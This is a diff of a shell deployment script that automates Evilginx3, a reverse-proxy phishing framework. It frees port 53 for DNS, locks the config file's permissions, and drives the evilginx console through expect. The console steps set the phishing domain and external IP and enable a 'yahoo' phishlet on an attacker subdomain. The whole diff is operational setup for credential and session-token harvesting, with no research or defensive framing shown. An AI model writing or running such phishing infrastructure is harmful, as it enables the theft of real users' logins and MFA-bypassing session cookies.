@@ -535,6 +535,10 @@ start_service() {
 configure_evilginx_integration() {
     log "Configuring Evilginx3 integration..."
 
+    # Ensure config.yaml has correct permissions
+    chmod 600 "$EVILGINX_DIR/config.yaml"
+
+
     # 1. Resolve Port 53 conflict (systemd-resolved)
     if grep -q "DNSStubListener=yes" /etc/systemd/resolved.conf || ! grep -q "DNSStubListener" /etc/systemd/resolved.conf; then
         log "Disabling systemd-resolved stub listener to free port 53..."
@@ -632,20 +636,14 @@ log_user 1
 spawn /usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
 
 expect {
-    -re "evilginx\s+>\s?$" {
-        send "config https_port 8443\r"
+    -re "evilginx\s+>\s?$" { # Wait for the prompt
+        # Core config (domain, IP, ports) are now read from config.yaml
+        # Only phishlet-specific commands are sent interactively
+        send "config domain $DOMAIN\r" # Ensure domain is set in DB
         expect -re "evilginx\s+>"
-        send "config http_port 8081\r"
+        send "config ipv4 external $VPS_IP\r" # Ensure external IP is set in DB
         expect -re "evilginx\s+>"
-        send "config dns_port 0\r"
-        expect -re "evilginx\s+>"
-        send "config domain $DOMAIN\r"
-        expect -re "evilginx\s+>"
-        send "config ipv4 external $VPS_IP\r"
-        expect -re "evilginx\s+>"
-        send "config autocert off\r"
-        expect -re "evilginx\s+>"
-        
+
         # Enable phishlets
         send "phishlets hostname yahoo $EP1.$DOMAIN\r"
         expect -re "evilginx\s+>"
